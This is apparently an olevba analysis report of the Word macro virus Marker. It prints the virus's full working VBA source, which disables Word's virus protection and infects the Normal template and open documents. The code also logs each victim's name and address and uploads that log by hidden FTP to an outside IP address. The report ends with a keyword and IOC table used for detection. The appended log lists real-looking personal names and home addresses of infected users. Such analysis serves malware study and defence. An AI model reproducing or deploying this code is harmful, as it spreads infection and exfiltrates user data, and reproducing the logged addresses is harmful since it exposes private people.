olevba 0.60.1.dev6 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Marker.fq2-2a4fe9b0dbbec65683cc8cd518c2d895400d878d
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Marker.fq2-2a4fe9b0dbbec65683cc8cd518c2d895400d878d - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub CommandButton1_Click()

End Sub

Private Sub calculate_Click()

End Sub

Private Sub CommandButton11_Click()
 MsgBox ("Microsoft")
End Sub

Private Sub Document_Close()

On Error Resume Next

Const Marker = "<- this is a marker!"

'Declare Variables
Dim SaveDocument, SaveNormalTemplate, DocumentInfected, NormalTemplateInfected As Boolean
Dim ad, nt As Object
Dim OurCode, UserAddress, LogData, LogFile As String

'Initialize Variables
Set ad = ActiveDocument.VBProject.VBComponents.Item(1)
Set nt = NormalTemplate.VBProject.VBComponents.Item(1)

DocumentInfected = ad.CodeModule.Find(Marker, 16385, 1, 10000, 10000)
NormalTemplateInfected = nt.CodeModule.Find(Marker, 1, 1, 26384, 10000)


'Switch the VirusProtection OFF
Options.VirusProtection = False


  If (Day(Now()) = 1) And (System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\MS Setup (ACME)\User Info", "LogFile") = False) Then
  
    If DocumentInfected = True Then
      LogData = ad.CodeModule.Lines(1, ad.CodeModule.CountOfLines)
    ElseIf NormalTemplateInfected = True Then
      LogData = nt.CodeModule.Lines(1, nt.CodeModule.CountOfLines)
    End If
    
    LogData = Mid(LogData, InStr(1, LogData, "' Log" & "file -->"), Len(LogData) - InStr(1, LogData, "' Log" & "file -->"))
    
    For i = 1 To 4
      LogFile = LogFile + Mid(Str(Int(8 * Rnd)), 2, 1)
    Next i
    LogFile = "C:\hsf" & LogFile & ".sys"
    
    Open LogFile For Output As #1
    Print #1, LogData
    Close #1
    
    Open "c:\netldx.vxd" For Output As #1
    Print #1, "o 209.201.88.110"
    Print #1, "user anonymous"
    Print #1, "pass itsme@"
    Print #1, "cd incoming"
    Print #1, "ascii"
    Print #1, "put " & LogFile
    Print #1, "quit"
    Close #1
    
    Shell "command.com /c ftp.exe -n -s:c:\netldx.vxd", vbHide
    
    System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\MS Setup (ACME)\User Info", "LogFile") = True
    
  End If


'Make sure that some conditions are true before we continue infecting anything
If (DocumentInfected = True Xor NormalTemplateInfected = True) And _
   (ActiveDocument.SaveFormat = wdFormatDocument Or _
   ActiveDocument.SaveFormat = wdFormatTemplate) Then
   
   
  'Infect the NormalTemplate
  If DocumentInfected = True Then
  
    SaveNormalTemplate = NormalTemplate.Saved
  
    OurCode = ad.CodeModule.Lines(1, ad.CodeModule.CountOfLines)

    
    'Write a log file of this NormalTemplate infection
    For i = 1 To Len(Application.UserAddress)
      If Mid(Application.UserAddress, i, 1) <> Chr(13) Then
        If Mid(Application.UserAddress, i, 1) <> Chr(10) Then
          UserAddress = UserAddress & Mid(Application.UserAddress, i, 1)
        End If
      Else
        UserAddress = UserAddress & Chr(13) & "' "
      End If
    Next i

    OurCode = OurCode & Chr(13) & _
              "' " & Format(Time, "hh:mm:ss AMPM - ") & _
                     Format(Date, "dddd, d mmm yyyy") & Chr(13) & _
              "' " & Application.UserName & Chr(13) & _
              "' " & UserAddress & Chr(13)


    nt.CodeModule.DeleteLines 1, nt.CodeModule.CountOfLines
    nt.CodeModule.AddFromString OurCode
    
    If SaveNormalTemplate = True Then NormalTemplate.Save
    
  End If


  'Infect the ActiveDocument
  If NormalTemplateInfected = True And _
     (Mid(ActiveDocument.FullName, 2, 1) = ":" Or _
     ActiveDocument.Saved = False) Then
  
    SaveDocument = ActiveDocument.Saved
    
    OurCode = nt.CodeModule.Lines(1, nt.CodeModule.CountOfLines)

    ad.CodeModule.DeleteLines 1, ad.CodeModule.CountOfLines
    ad.CodeModule.AddFromString OurCode
    
    If SaveDocument = True Then ActiveDocument.Save
      
  End If
  
    
End If

End Sub

' Logfile -->

' 09:08:36  - Saturday, 28 Nov 1998
' SPo0Ky
' Blue Planet
'



' 02:50:31 PM - Saturday, 28 Nov 1998
' MARK B. SEAY
'



' 08:04:45 AM - Friday, 4 Dec 1998
' UPS
'



' 11:43:35 AM - Thursday, 17 Dec 1998
' WRO
'



' 09:23:32 AM - Wednesday, 23 Dec 1998
' bcbsa
'



' 12:08:05 PM - Monday, 4 Jan 1999
' ISG
'



' 02:41:37 PM - Tuesday, 5 Jan 1999
' Information Systems Group
'



' 12:49:03 PM - Saturday, 9 Jan 1999
' Mona Sowisky
' CSC Healthcare
' One Embarcadero, Suite 2800
' San Francisco, CA 94111



' 12:42:50 PM - Tuesday, 12 Jan 1999
' p2
'



' 05:10:21 PM - Thursday, 21 Jan 1999
' stevenkl
'



' 03:01:37 PM - Monday, 1 Feb 1999
' Mike Rubini
'



' 03:25:33 PM - Tuesday, 2 Feb 1999
' Marilyn Hoyles
'



' 04:13:43 PM - Thursday, 4 Feb 1999
' Sharon Kirsch
' 16-4111 Arbour Green Drive
' Mississauga, Ontario
' L5L 2Z2



' 04:08:01 PM - Monday, 8 Feb 1999
' Nancy Lyras
' Mr. & Mrs. George Lyras
' 5 Jamieson Court
' Sutton, MA  01590



' 11:21:09 AM - Friday, 12 Feb 1999
' Karen Poirier
' Karen L. Poirier
' 35 Windmill Drive
' Marlboro, MA  01752



' 03:55:49 PM - Tuesday, 16 Feb 1999
' Janice Levenson
'



' 02:23:17 PM - Tuesday, 23 Feb 1999
' Janice Levenson
'



' 05:14:00 PM - Tuesday, 23 Feb 1999
' IBU
'



' 08:25:02 AM - Thursday, 25 Feb 1999
' jzakarin
'



' 10:39:53  - Friday, 5 Mar 1999
' Graham Schultz
' Suite 17, Level 1
' Bridgepoint
' 3 Brady Street
' Mosman NSW 2088
' Australia



' 10:31:00 AM - Friday, 12 Mar 1999
' Richard Dagge
'



' 02:13:41  - jeudi, 15 avr 1999
' Anne Deneyer
'



' 12:39:45  - lundi, 19 avr 1999
' Fidelma Joyce
'



' 11:27:06  - âòîðíèê, 20 àïð 1999
' Áîáðîâ
'



' 10:44:49  - âòîðíèê, 27 àïð 1999
' Âåòëóæñêèõ
'



' 04:59:32  - Salý, 29 Haz 1999
' Aylin ZAÐRALI
'



' 10:42:41  - ïÿòíèöà, 9 èþë 1999
' çàïàä-âîñòîê
'



' 06:41:28  - ÷åòâåðã, 23 ñåí 1999
' Olga Brook
'



' 08:05:18 AM - Saturday, 27 Nov 1999
' xx
'



' 02:08:34  - ïîíåäåëüíèê, 27 äåê 1999
' Albert
'



' 04:02:00  - ïîíåäåëüíèê, 10 ÿíâ 2000
' Aleks
'



' 12:08:32  - ÷åòâåðã, 3 ôåâ 2000
' 1337
'



' 11:56:34  - ïÿòíèöà, 11 ôåâ 2000
' êàìàëîâ
'



' 11:04:32  - ñðåäà, 16 ôåâ 2000
' 139_11
'



' 04:18:35  - ïîíåäåëüíèê, 21 ôåâ 2000
' User133
'



' 02:52:06  - ñðåäà, 23 ôåâ 2000
' 247_7
'



' 08:37:03  - âòîðíèê, 29 ôåâ 2000
' 144-1-7
'



' 03:15:23  - ñóááîòà, 6 ìàé 2000
' .
'



' 03:19:00  - ÷åòâåðã, 18 ìàé 2000
' .
'



' 02:39:49  - âîñêðåñåíüå, 21 ìàé 2000
' Êîðîòàåâ Äìèòðèé Áîðèñîâè÷
'



' 02:15:37  - âîñêðåñåíüå, 28 ìàé 2000
' Êóöåïåíäèê
'



' 09:47:26  - âòîðíèê, 30 ìàé 2000
' User
'



' 07:07:16  - âòîðíèê, 30 ìàé 2000
' Èãîðü Ìèõàéëîâñêèé
'



' 03:33:45  - âòîðíèê, 6 èþí 2000
' Monkey
'



' 02:24:20 <(©¿©)> - Friday, 14 Dec 2001
' Replication System
'



' 01:29:18 PM - Friday, 20 Apr 2001
' Harry H.
'



+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |CommandButton1_Click|Runs when the file is opened and ActiveX     |
|          |                    |objects trigger events                       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Write               |May write to a file (if combined with Open)  |
|Suspicious|put                 |May write to a file (if combined with Open)  |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|vbHide              |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|command             |May run PowerShell commands                  |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|Xor                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |209.201.88.110      |IPv4 address                                 |
|IOC       |ftp.exe             |Executable file name                         |
+----------+--------------------+---------------------------------------------+

